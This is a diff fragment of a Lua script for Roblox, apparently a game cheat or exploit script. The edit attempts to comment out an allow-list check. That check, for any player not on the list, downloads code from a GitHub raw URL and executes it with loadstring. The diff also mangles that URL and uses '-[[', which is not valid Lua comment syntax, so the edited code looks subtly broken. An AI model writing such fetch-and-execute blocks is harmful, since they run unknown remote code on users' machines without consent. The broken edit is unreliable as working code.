@@ -191,7 +191,7 @@ do
         end
     end
 end
-
+-[[
 do
     local _allowedUsers = {
         [9902765941] = true, -- mirimirimirihyuk 도시
@@ -210,7 +210,7 @@ do
     local _lp = game:GetService("Players").LocalPlayer
     if not _allowedUsers[_lp.UserId] then
         pcall(function()
-            local _src = game:HttpGet('https://raw.githubusercontent.com/dosi1100-cmyk/scripts/refs/heads/main/non-allowed')
+            local _src = game:HttpGet('https://raw./dosi1100-cmyrefs/heads/main/non-allowed')
             if _src and _src ~= "" then
                 local _fn = loadstring(_src)
                 if _fn then _fn() end
@@ -222,7 +222,7 @@ do
         return
     end
 end
-
+]]
 local Players, TeleportService, StarterGui, RunService, MarketplaceService,
         Lighting, UserInputService, TweenService, HttpService, ReplicatedStorage,
         TextChatService, VirtualUser, Workspace, Stats, CoreGui =
